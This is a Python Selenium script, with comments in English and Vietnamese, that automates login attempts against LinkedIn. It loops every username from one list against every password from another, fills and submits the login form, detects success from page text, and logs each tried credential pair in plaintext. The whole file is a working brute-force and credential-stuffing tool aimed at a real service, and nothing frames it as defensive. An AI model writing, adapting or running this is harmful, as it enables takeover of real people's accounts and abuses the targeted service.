import time
import logging
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# Set up logging
# Thiết lập đăng nhập
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def initialize_driver():
    return webdriver.Chrome()

def login(driver, url, username, password):
    driver.get(url)
    url_logout = "https://www.linkedin.com/m/logout/?lipi=urn%3Ali%3Apage%3Ad_flagship3_feed%3BpxES6NCwT2eqedRt0jH%2Blg%3D%3D"
    try:
        # Locate the username, password, and login button elements of web Linkedin
        # Nơi các thẻ username, mật khẩu và nút đăng nhập của web Linkedin
        username_field = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, 'session_key')))
        password_field = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, 'session_password')))
        login_button = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, "//*[@id=\"main-content\"]/section[1]/div/div/form/div[2]/button")))

        # Fill in the username and password fields
        # Điền vào các field username và mật khẩu
        username_field.clear()
        username_field.send_keys(username)
        password_field.clear()
        password_field.send_keys(password)

        # Click the login button
        # Nhấn vào nút Đăng nhập
        login_button.click()

        time.sleep(20)  # Adjust as needed

        # Check for successful login or failure
        if "Welcome, anh!"  in driver.page_source:
            logger.info(f'Login Success: Username => {username}, Password => {password}')
        # Auto Logout when Login Success 
        # Tự động Đăng xuất khi Đăng nhập thành công
            driver.get(url_logout)
        else:
            logger.info(f'Login Failed: Username => {username}, Password => {password}')

        # Return to the login page for the next attempt
        # Quay lại trang đăng nhập cho lần đăng nhập tiếp theo
        driver.get(url)
        time.sleep(2)  # Adjust as needed
    except Exception as e:
        logger.error(f'Error: {str(e)}')

def main():
    url = input('[+] Enter Page URL: ')
    username_file = input('[+] Enter Username List: ')
    password_file = input('[+] Enter Password List: ')

    driver = initialize_driver()

    with open(username_file, 'r') as usernames, open(password_file, 'r') as passwords:
        username_list = usernames.readlines()
        password_list = passwords.readlines()

    for username in username_list:
        for password in password_list:
            username = username.strip()#Loại bỏ khoảng trắng ở đầu và cuối của username và mật khẩu
            password = password.strip()
            logger.info(f'Trying Username: {username} with Password: {password}')
            login(driver, url, username, password)

    driver.quit()

if __name__ == '__main__':
    main()